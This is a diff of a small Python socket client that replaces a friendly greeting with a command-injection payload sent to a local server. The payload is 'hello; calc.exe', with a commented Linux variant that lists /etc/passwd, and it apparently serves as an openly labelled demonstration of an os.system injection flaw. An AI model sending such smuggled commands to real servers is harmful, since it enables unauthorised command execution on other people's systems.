@@ -1,30 +1,26 @@
 import socket
 
 def start_client():
-    # 1. Create a TCP/IP socket
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    # 2. Define the server's IP address and port
-    host = '127.0.0.1'  # Must match the server's IP
-    port = 65432        # Must match the server's port
+    host = '127.0.0.1'
+    port = 65432
 
     try:
-        # 3. Connect to the server
         client_socket.connect((host, port))
         
-        # 4. Send a message to the server
-        message = "Hello, Server! This is the Python client."
-        client_socket.sendall(message.encode('utf-8'))
-        print(f"Sent: {message}")
-
-        # 5. Receive the server's response
-        data = client_socket.recv(1024)
-        print(f"Received from server: {data.decode('utf-8')}")
+        # --- THE BUG: MALICIOUS PAYLOAD ---
+        # Instead of a friendly message, we send a command injection payload.
+        # This will trick the server's 'os.system' into opening the Calculator (on Windows)
+        # or listing sensitive files (on Linux/Mac).
+        buggy_message = "hello; calc.exe" # For Windows demo
+        # buggy_message = "hello; ls -la /etc/passwd" # For Linux demo
         
-    except ConnectionRefusedError:
-        print("Connection failed. Is the server running?")
+        client_socket.sendall(buggy_message.encode('utf-8'))
+        
+        data = client_socket.recv(1024)
+        print(f"Server Response: {data.decode('utf-8')}")
+        
     finally:
-        # 6. Close the connection
         client_socket.close()
 
 if __name__ == "__main__":
